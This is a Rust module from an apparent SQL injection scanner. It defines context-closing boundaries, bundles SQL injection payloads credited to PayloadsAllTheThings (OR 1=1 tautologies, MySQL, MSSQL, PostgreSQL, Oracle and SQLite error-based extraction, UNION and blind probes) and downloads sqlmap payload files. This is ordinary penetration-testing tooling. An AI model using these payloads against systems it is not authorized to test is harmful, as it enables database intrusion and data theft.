//! Dynamic payload database for SQX.
//!
//! Three tiers:
//!
//! 1. **Built-in boundaries** — our own list of SQL injection boundaries
//!    (prefix/suffix pairs to close context). Written independently; the
//!    concept of boundaries is generic SQLi knowledge, not proprietary.
//!
//! 2. **Bundled PATT payloads** — curated subset from PayloadsAllTheThings
//!    (MIT license — free to embed). Loaded at compile time.
//!
//! 3. **Fetched payloads** — `sqx update-payloads` downloads sqlmap XML
//!    (GPLv2) and fresh PATT lists into `~/.local/share/sqx/payloads/`.
//!    We never *distribute* these files; the user fetches them explicitly.

use std::path::PathBuf;
use anyhow::{anyhow, Result};
use tracing::info;
use serde::{Serialize, Deserialize};

// ── 1. Built-in boundary list ─────────────────────────────────────────────────

/// A context boundary: how to close the current SQL context before injecting.
#[derive(Debug, Clone)]
pub struct Boundary {
    /// Suffix appended to the original value to close its context.
    /// e.g. `'` closes a string, `)` closes a parenthesised expression.
    pub close: &'static str,
    /// Comment / balancing suffix to keep the query syntactically valid.
    /// e.g. `-- `, `#`, `AND 'x'='x`.
    pub balance: &'static str,
    /// Human-readable context label (for logging/evidence).
    pub label: &'static str,
}

/// Comprehensive boundary list — independently written.
/// Covers single-quote, double-quote, numeric, parenthesised, and
/// multi-level nesting contexts commonly found in real applications.
pub static BOUNDARIES: &[Boundary] = &[
    // ── Single-quote string ───────────────────────────────────────────────────
    Boundary { close: "'",    balance: "-- ",         label: "sq-comment"        },
    Boundary { close: "'",    balance: "#",            label: "sq-hash"           },
    Boundary { close: "'",    balance: "/*",           label: "sq-block"          },
    Boundary { close: "'",    balance: "AND 'a'='a",   label: "sq-and-str"        },
    Boundary { close: "'",    balance: "OR 'a'='a",    label: "sq-or-str"         },
    // ── Single-quote with parenthesis ─────────────────────────────────────────
    Boundary { close: "')",   balance: "-- ",          label: "sq-paren"          },
    Boundary { close: "')",   balance: "#",            label: "sq-paren-hash"     },
    Boundary { close: "'))",  balance: "-- ",          label: "sq-dparen"         },
    Boundary { close: "'))",  balance: "#",            label: "sq-dparen-hash"    },
    Boundary { close: "'))",  balance: "AND ('a'='a",  label: "sq-dparen-and"     },
    // ── Double-quote string ───────────────────────────────────────────────────
    Boundary { close: "\"",   balance: "-- ",          label: "dq-comment"        },
    Boundary { close: "\"",   balance: "#",            label: "dq-hash"           },
    Boundary { close: "\"",   balance: "AND \"a\"=\"a",label: "dq-and-str"        },
    Boundary { close: "\")",  balance: "-- ",          label: "dq-paren"          },
    Boundary { close: "\"))", balance: "-- ",          label: "dq-dparen"         },
    // ── Numeric / unquoted ────────────────────────────────────────────────────
    Boundary { close: "",     balance: "-- ",          label: "num-comment"       },
    Boundary { close: "",     balance: "AND 1=1",      label: "num-and"           },
    Boundary { close: "",     balance: "AND 1=1-- ",   label: "num-and-comment"   },
    Boundary { close: ")",    balance: "-- ",          label: "num-paren"         },
    Boundary { close: "))",   balance: "-- ",          label: "num-dparen"        },
    // ── Backtick (MySQL identifier context) ──────────────────────────────────
    Boundary { close: "`",    balance: "-- ",          label: "backtick"          },
    // ── Stacked / multi-statement ────────────────────────────────────────────
    Boundary { close: "';",   balance: "-- ",          label: "sq-stack"          },
    Boundary { close: "\";",  balance: "-- ",          label: "dq-stack"          },
    Boundary { close: ";",    balance: "-- ",          label: "num-stack"         },
];

// ── 2. Bundled PATT error payloads (MIT) ──────────────────────────────────────
//
// Curated subset from PayloadsAllTheThings (MIT License).
// Source: https://github.com/swisskyrepo/PayloadsAllTheThings
// Only detection/fingerprint payloads included — no destructive statements.

pub static BUNDLED_ERROR_PAYLOADS: &[&str] = &[
    // Generic triggers
    "'", "\"", "`", "\\", "%27", "%22",
    "''", "\"\"",
    "' '", "\" \"",
    // Boolean logic
    "' OR '1'='1", "' OR 1=1-- ", "' OR 'a'='a",
    "\" OR \"1\"=\"1", "\" OR 1=1-- ",
    "1 OR 1=1", "1' OR '1'='1",
    // Error triggers — MySQL
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))-- ",
    "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)-- ",
    "' AND EXP(~(SELECT * FROM (SELECT version())x))-- ",
    "' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)-- ",
    // Error triggers — MSSQL
    "' AND 1=CONVERT(INT,(SELECT @@version))-- ",
    "'; WAITFOR DELAY '0:0:0'-- ",
    "' AND 1=(SELECT TOP 1 CAST(name AS INT) FROM sys.tables)-- ",
    // Error triggers — PostgreSQL
    "' AND 1=CAST(version() AS INT)-- ",
    "' AND 1=(SELECT CAST(current_database() AS INT))-- ",
    // Error triggers — Oracle
    "' AND 1=CTXSYS.DRITHSX.SN(user,(SELECT banner FROM v$version WHERE rownum=1))-- ",
    "' AND XMLTYPE((SELECT banner FROM v$version WHERE rownum=1))=1-- ",
    // Error triggers — SQLite
    "' AND 1=sqlite_version()-- ",
    "' UNION SELECT sqlite_version()-- ",
    // UNION fingerprint
    "' UNION SELECT NULL-- ",
    "' UNION SELECT NULL,NULL-- ",
    "' UNION SELECT NULL,NULL,NULL-- ",
    // Blind detection
    "' AND 1=1-- ", "' AND 1=2-- ",
    "' AND 'a'='a", "' AND 'a'='b",
    "1 AND 1=1", "1 AND 1=2",
];

// ── 3. Runtime fetcher ────────────────────────────────────────────────────────

const FETCH_SOURCES: &[(&str, &str)] = &[
    // sqlmap XML — GPLv2. User fetches; we never distribute.
    ("boolean_blind.xml",
     "https://raw.githubusercontent.com/sqlmapproject/sqlmap/master/data/xml/payloads/boolean_blind.xml"),
    ("error_based.xml",
     "https://raw.githubusercontent.com/sqlmapproject/sqlmap/master/data/xml/payloads/error_based.xml"),
    ("time_blind.xml",
     "https://raw.githubusercontent.com/sqlmapproject/sqlmap/master/data/xml/payloads/time_blind.xml"),
    ("union_select.xml",
     "https://raw.githubusercontent.com/sqlmapproject/sqlmap/master/data/xml/payloads/union_select.xml"),
    ("stacked_queries.xml",
     "https://raw.githubusercontent.com/sqlmapproject/sqlmap/master/data/xml/payloads/stacked_queries.xml"),
    // PayloadsAllTheThings full list — MIT.
    ("patt_sqli.txt",
     "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/Intruder/SQL-Injection.txt"),
];

// ── Dynamic payload set (built-in + cached) ───────────────────────────────────

/// A boundary from sqlmap XML.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SqlmapBoundary {
    pub level: u8,
    pub clause: Vec<u8>, // Bits for clauses
    pub where_clause: Vec<u8>, // Bits for where
    pub pt_type: Option<u8>,
    pub prefix: String,
    pub suffix: String,
}

/// A test from sqlmap XML.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SqlmapTest {
    pub title: String,
    pub stype: u8, // 1: boolean, 2: error, 3: union, 4: stacked, 5: time, 6: inline
    pub level: u8,
    pub risk: u8,
    pub clause: Vec<u8>,
    pub where_clause: Vec<u8>,
    pub vector: String,
    pub request_payload: String,
    pub response_comparison: Option<String>, // grep pattern
    pub details: std::collections::HashMap<String, String>,
}

/// Complete payload set available at scan time.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct DynamicPayloads {
    /// Boundaries from sqlmap XML (fetched).
    pub boundaries: Vec<SqlmapBoundary>,
    /// Tests from sqlmap XML (fetched).
    pub tests: Vec<SqlmapTest>,
    /// PayloadsAllTheThings extra strings.
    pub extra_patt: Vec<String>,
}

impl DynamicPayloads {
    /// Load from disk cache. Falls back to empty (built-ins still apply).
    pub fn load() -> Self {
        let dir = match cache_dir() { Some(d) => d, None => return Self::default() };
        let mut out = Self::default();

        let files = [
            "boolean_blind.xml",
            "error_based.xml",
            "time_blind.xml",
            "union_select.xml",
            "stacked_queries.xml",
        ];

        for file in files {
            if let Ok(xml) = std::fs::read_to_string(dir.join(file)) {
                out.tests.extend(parse_sqlmap_tests(&xml));
            }
        }

        if let Ok(xml) = std::fs::read_to_string(dir.join("boundaries.xml")) {
            out.boundaries.extend(parse_sqlmap_boundaries_extended(&xml));
        } else {
            // Fallback: build boundaries from boolean_blind.xml if boundaries.xml is missing
            // (sqlmap sometimes has them embedded or in separate files depending on version)
            if let Ok(xml) = std::fs::read_to_string(dir.join("boolean_blind.xml")) {
                 out.boundaries.extend(parse_sqlmap_boundaries_extended(&xml));
            }
        }

        if let Ok(txt) = std::fs::read_to_string(dir.join("patt_sqli.txt")) {
            out.extra_patt.extend(
                txt.lines()
                    .map(str::trim)
                    .filter(|l| !l.is_empty() && !l.starts_with('#'))
                    .map(String::from),
            );
        }

        info!(
            "Dynamic payloads loaded: {} boundaries, {} tests, {} PATT strings from cache",
            out.boundaries.len(),
            out.tests.len(),
            out.extra_patt.len(),
        );
        out
    }

    /// Look up a boundary by its label or prefix.
    pub fn find_boundary(label: &str) -> Option<(String, String)> {
        for b in BOUNDARIES {
            if b.label.eq_ignore_ascii_case(label) {
                return Some((b.close.to_string(), b.balance.to_string()));
            }
        }
        let dynamic = Self::load();
        for b in &dynamic.boundaries {
            let synthetic = format!("dyn:{}", b.prefix);
            if synthetic.eq_ignore_ascii_case(label) {
                return Some((b.prefix.clone(), b.suffix.clone()));
            }
        }
        None
    }

    /// True if at least one sqlmap XML file is cached.
    pub fn is_cached() -> bool {
        cache_dir().map(|d| d.join("boolean_blind.xml").exists()).unwrap_or(false)
    }

    /// Fetch all sources and write to cache.
    pub async fn fetch_and_cache() -> Result<()> {
        let dir = cache_dir().ok_or_else(|| anyhow!("Cannot determine cache dir"))?;
        std::fs::create_dir_all(&dir)?;

        eprintln!("\nUpdating payload database (External sources: GPLv2/MIT)...");

        let client = reqwest::Client::builder()
            .timeout(std::time::Duration::from_secs(30))
            .user_agent("Mozilla/5.0 (compatible; sqx-updater/1.0)")
            .build()?;

        let mut ok = 0;
        for (filename, url) in FETCH_SOURCES {
            eprint!("  {:30} ", filename);
            match client.get(*url).send().await {
                Ok(r) if r.status().is_success() => {
                    let body = r.text().await?;
                    std::fs::write(dir.join(filename), &body)?;
                    eprintln!("✓");
                    ok += 1;
                }
                Ok(r)  => eprintln!("✗ HTTP {}", r.status()),
                Err(e) => eprintln!("✗ {}", e),
            }
        }

        // Also fetch boundaries.xml explicitly
        let b_url = "https://raw.githubusercontent.com/sqlmapproject/sqlmap/master/data/xml/boundaries.xml";
        eprint!("  {:30} ", "boundaries.xml");
        if let Ok(r) = client.get(b_url).send().await {
            if r.status().is_success() {
                if let Ok(body) = r.text().await {
                    let _ = std::fs::write(dir.join("boundaries.xml"), &body);
                    eprintln!("✓");
                }
            }
        }

        Ok(())
    }
}

// ── XML helpers ───────────────────────────────────────────────────────────────

fn parse_sqlmap_tests(xml: &str) -> Vec<SqlmapTest> {
    split_tags(xml, "test")
        .into_iter()
        .filter_map(|t| {
            let title = extract_tag(&t, "title")?;
            let stype = extract_tag(&t, "stype")?.parse().unwrap_or(1);
            let level = extract_tag(&t, "level")?.parse().unwrap_or(1);
            let risk = extract_tag(&t, "risk")?.parse().unwrap_or(1);
            
            let clause = parse_csv_u8(&extract_tag(&t, "clause").unwrap_or_default());
            let where_clause = parse_csv_u8(&extract_tag(&t, "where").unwrap_or_default());
            
            let vector = extract_tag(&t, "vector").unwrap_or_default();
            let request_payload = extract_tag(&extract_tag(&t, "request").unwrap_or_default(), "payload").unwrap_or_default();
            let response_comparison = extract_tag(&extract_tag(&t, "response").unwrap_or_default(), "comparison");

            Some(SqlmapTest {
                title, stype, level, risk, clause, where_clause, vector, request_payload, response_comparison,
                details: std::collections::HashMap::new(),
            })
        })
        .collect()
}

fn parse_sqlmap_boundaries_extended(xml: &str) -> Vec<SqlmapBoundary> {
    split_tags(xml, "boundary")
        .into_iter()
        .filter_map(|b| {
            let level = extract_tag(&b, "level")?.parse().unwrap_or(1);
            let clause = parse_csv_u8(&extract_tag(&b, "clause").unwrap_or_default());
            let where_clause = parse_csv_u8(&extract_tag(&b, "where").unwrap_or_default());
            let prefix = extract_tag(&b, "prefix").unwrap_or_default();
            let suffix = extract_tag(&b, "suffix").unwrap_or_default();
            let pt_type = extract_tag(&b, "ptype").and_then(|s| s.parse().ok());

            Some(SqlmapBoundary {
                level, clause, where_clause, prefix, suffix, pt_type,
            })
        })
        .collect()
}

fn parse_csv_u8(s: &str) -> Vec<u8> {
    s.split(',')
        .filter_map(|v| v.trim().parse().ok())
        .collect()
}

fn split_tags(xml: &str, tag: &str) -> Vec<String> {
    let open  = format!("<{}>",  tag);
    let close = format!("</{}>", tag);
    let mut out = Vec::new();
    let mut rest = xml;
    while let Some(s) = rest.find(&open) {
        let cs = s + open.len();
        if let Some(e) = rest[cs..].find(&close) {
            out.push(rest[cs..cs + e].to_string());
            rest = &rest[cs + e + close.len()..];
        } else { break; }
    }
    out
}

fn extract_tag(block: &str, tag: &str) -> Option<String> {
    let open  = format!("<{}>",  tag);
    let close = format!("</{}>", tag);
    let s = block.find(&open)? + open.len();
    let e = block[s..].find(&close)?;
    Some(block[s..s + e].to_string())
}

// ── Cache directory ───────────────────────────────────────────────────────────

fn cache_dir() -> Option<PathBuf> {
    let base = std::env::var("XDG_DATA_HOME")
        .ok()
        .map(PathBuf::from)
        .or_else(|| std::env::var("HOME").ok().map(|h| PathBuf::from(h).join(".local").join("share")))?;
    Some(base.join("sqx").join("payloads"))
}
